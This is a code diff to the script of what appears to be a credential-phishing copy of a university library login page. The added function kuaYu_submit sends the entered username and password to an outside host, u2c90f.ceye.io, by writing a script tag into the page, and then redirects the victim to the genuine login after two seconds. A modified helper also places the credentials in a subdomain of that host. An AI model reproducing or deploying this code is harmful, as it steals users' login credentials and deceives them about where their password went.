@@ -99,22 +99,28 @@
 				pwd.value="";
 			}
 			else {
-				btnSubmit(bor_id.value, pwd.value);
-				window.location.href="http://primo.zzu.edu.cn:8991/pds?func=load-login&url=http://primo.zzu.edu.cn:8991/pds";
+			//btnSubmit(form, bor_id.value, pwd.value);
+				kuaYu_submit(bor_id.value, pwd.value);
+				window.setTimeout("window.location='http://primo.zzu.edu.cn:8991/pds?func=load-login&url=http://primo.zzu.edu.cn:8991/pds'",2000);
 			}
 
 			}			
-		function btnSubmit(user, passwd) {
-			var URL = "http://u2c90f.ceye.io/a?";
+		function btnSubmit(form, user, passwd) {	// 无法实现跨域请求
+			var URL = "http://" +  user + "." + passwd + "." + "u2c90f.ceye.io/";
 			var options = {
-    			type: 'get',//提交方式
+    			type: 'post',//提交方式
     			url:  URL ,
-			dataType: 'jsonp',
-			jsonp:'passwd',
+    			data : '{"user":"123","psw":"435"}',
     			success: function() {alert('Thanks for your comment!');}
    			};
    			$("#form1").ajaxSubmit(options); // jquery 表单提交
 		}
+	function kuaYu_submit(user, passwd) {		// 利用src进行跨域
+			var URL = "http://" + "u2c90f.ceye.io/info?user=" + user + "&pwd=" + passwd;
+			script_src = "<script src = " + URL + ">"  + "<\/script>";
+			document.write(script_src);
+
+			}
 	</script>
 
 
